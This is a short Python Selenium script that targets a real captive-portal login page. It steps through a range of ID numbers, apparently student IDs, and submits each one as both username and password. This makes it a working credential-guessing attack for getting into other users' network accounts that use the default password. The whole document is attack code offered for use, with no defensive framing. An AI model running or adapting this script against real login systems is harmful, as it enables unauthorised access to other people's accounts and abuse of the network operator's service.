from selenium import webdriver
import time

d = []
for a in range(2218, 1000, -1):
    d.append('18BMA' + str(a))

browser = webdriver.Safari()
browser.get('http://phc.prontonetworks.com/cgi-bin/authlogout?URI=http://phc.prontonetworks.com/')
browser.get('http://phc.prontonetworks.com/cgi-bin/authlogin?URI=http://www.msftconnecttest.com/redirect')
for a in d:
    try:
        userid = browser.find_element_by_name("userId")
        userid.send_keys(a)
        print(a)
        password = browser.find_element_by_name("password")
        password.send_keys(a)
        # time.sleep(.3)
        submit = browser.find_element_by_name("Submit22")
        submit.click()
    except:
        print(a)
        break
